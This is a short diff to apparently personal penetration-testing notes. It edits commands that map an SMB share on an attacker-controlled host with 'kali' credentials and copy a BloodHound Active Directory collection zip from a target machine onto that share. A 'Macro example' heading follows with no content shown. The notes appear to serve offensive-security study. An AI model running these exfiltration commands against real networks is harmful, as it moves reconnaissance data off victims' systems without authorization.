@@ -30,8 +30,8 @@
    ```
 - Advance tech transfer files 
    ```
-    net use y: \\192.168.45.243\SHARE /user:kali kali
-    Move-Item -Path 20240623021511_BloodHound.zip -Destination \\192.168.45.243\SHARE\20240623021511_BloodHound.zip
+    net use z: \\192.168.45.243\SHARE /user:kali kali
+    Copy-Item -Path 20240728062407_BloodHound.zip -Destination z:\BloodHound
     ```
 
 - Macro example: 
